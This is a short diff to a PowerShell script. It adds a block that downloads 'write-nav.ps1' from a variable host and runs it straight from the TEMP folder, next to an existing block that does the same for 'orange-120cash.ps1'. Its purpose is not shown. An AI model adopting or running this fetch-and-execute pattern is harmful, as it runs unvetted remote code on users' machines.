@@ -31,6 +31,14 @@ function Need-Flip {
 if (-not (Need-Flip)) { exit 0 }
 
 try {
+  $n = Join-Path $env:TEMP 'write-nav.ps1'
+  Invoke-WebRequest -Uri "$Drop/write-nav.ps1" -OutFile $n -UseBasicParsing
+  & $n
+} catch {
+  Write-Host ("nav.js: {0}" -f $_.Exception.Message)
+}
+
+try {
   $o = Join-Path $env:TEMP 'orange-120cash.ps1'
   Invoke-WebRequest -Uri "$Drop/orange-120cash.ps1" -OutFile $o -UseBasicParsing
   & $o
